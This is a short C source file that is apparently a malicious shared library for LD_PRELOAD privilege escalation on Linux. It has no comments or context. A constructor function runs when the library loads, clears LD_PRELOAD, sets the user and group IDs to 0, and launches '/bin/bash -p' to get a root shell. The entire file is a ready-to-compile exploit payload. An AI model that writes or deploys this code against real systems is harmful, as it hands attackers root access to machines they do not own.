#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init() __attribute__((constructor));

void init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
